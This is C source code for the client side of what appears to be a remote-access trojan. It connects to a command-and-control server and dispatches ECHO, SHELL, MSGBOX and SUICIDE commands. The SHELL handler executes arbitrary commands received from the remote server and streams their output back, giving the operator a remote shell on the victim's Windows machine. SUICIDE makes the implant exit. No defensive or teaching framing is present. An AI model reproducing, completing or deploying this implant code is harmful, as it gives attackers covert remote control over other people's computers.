#include <windows.h>
#include "cnc.h"
#include "echo.h"
#include "shell.h"
#include "msgbox.h"
#include "logger.h"
#include "commander.h"

#define OUTPUT_BUFSIZE 8192

void handle_echo()
{
    int ret;
    struct echo_cmd cmd;

    log_info("Received ECHO command.");
    ret = recv_from_cnc(&cmd.text_len, sizeof(cmd.text_len));
    if (ret != sizeof(cmd.text_len))
    {
        log_error("Received invalid text length.");
        return;
    }
    cmd.text = malloc(cmd.text_len + 1);
    if (!cmd.text)
    {
        log_error("Failed to allocate memory for the text.");
        return;
    }
    ret = recv_from_cnc(cmd.text, cmd.text_len);
    if (ret != cmd.text_len)
    {
        log_error("Received invalid text.");
        return;
    }
    cmd.text[cmd.text_len] = 0;
    log_info("Received echo: \"%s\"", cmd.text);

    ret = send_to_cnc(cmd.text, cmd.text_len);
    free(cmd.text);
    if (ret != cmd.text_len)
    {
        log_error("Failed to send text to CNC.");
        return;
    }
}

void handle_shell()
{
    int ret;
    unsigned int bytes_read;
    struct shell_cmd cmd;
    char out[OUTPUT_BUFSIZE];

    log_info("Received SHELL command.");
    ret = recv_from_cnc(&cmd.cmd_len, sizeof(cmd.cmd_len));
    if (ret != sizeof(cmd.cmd_len))
    {
        log_error("Received invalid command length.");
        return;
    }
    cmd.cmd = malloc(cmd.cmd_len + 1);
    if (!cmd.cmd)
    {
        log_error("Failed to allocate memory for the command.");
        return;
    }
    ret = recv_from_cnc(cmd.cmd, cmd.cmd_len);
    if (ret != cmd.cmd_len)
    {
        log_error("Received invalid command.");
        return;
    }
    cmd.cmd[cmd.cmd_len] = 0;
    log_info("Command: \"%s\"", cmd.cmd);
    shell(&cmd);
    free(cmd.cmd);
    send_to_cnc(&cmd.exit_code, sizeof(cmd.exit_code));
    while (TRUE)
    {
        bytes_read = read_shell_output(out, sizeof(out));
        send_to_cnc(&bytes_read, sizeof(bytes_read));
        if (!bytes_read)
            return;
        send_to_cnc(out, bytes_read);
    }
}

void handle_msgbox()
{
    int ret;
    struct msgbox_cmd cmd;

    log_info("Received MSGBOX command.");

    ret = recv_from_cnc(&cmd.title_len, sizeof(cmd.title_len));
    if (ret != sizeof(cmd.title_len))
    {
        log_error("Received invalid title length.");
        return;
    }
    cmd.title = malloc(cmd.title_len + 1);
    if (!cmd.title)
    {
        log_error("Failed to allocate memory for the title.");
        return;
    }
    ret = recv_from_cnc(cmd.title, cmd.title_len);
    if (ret != cmd.title_len)
    {
        log_error("Received invalid title.");
        return;
    }
    cmd.title[cmd.title_len] = 0;

    ret = recv_from_cnc(&cmd.text_len, sizeof(cmd.text_len));
    if (ret != sizeof(cmd.text_len))
    {
        log_error("Received invalid text length.");
        return;
    }
    cmd.text = malloc(cmd.text_len + 1);
    if (!cmd.text)
    {
        log_error("Failed to allocate memory for the text.");
        return;
    }
    ret = recv_from_cnc(cmd.text, cmd.text_len);
    if (ret != cmd.text_len)
    {
        log_error("Received invalid text.");
        return;
    }
    cmd.text[cmd.text_len] = 0;

    log_info("Title: \"%s\", Text: \"%s\"", cmd.title, cmd.text);
    MessageBox(NULL, cmd.text, cmd.title, MB_OK);
    free(cmd.title);
    free(cmd.text);
}

void handle_suicide()
{
    log_info("Received SUICIDE command.");
    exit(EXIT_SUCCESS);
}

void listen_for_cmds()
{
    int ret;
    struct cmd cmd;

    while (TRUE)
    {
        log_info("Waiting for command.");
        ret = recv_from_cnc(&cmd, sizeof(struct cmd));
        if (ret != sizeof(struct cmd))
        {
            log_error("Received invalid command.");
            continue;
        }
        switch (cmd.type)
        {
        case ECHO_CMD_TYPE:
            handle_echo();
            break;
        case SHELL_CMD_TYPE:
            handle_shell();
            break;
        case MSGBOX_CMD_TYPE:
            handle_msgbox();
            break;
        case SUICIDE_CMD_TYPE:
            handle_suicide();
            break;
        }
    }
}
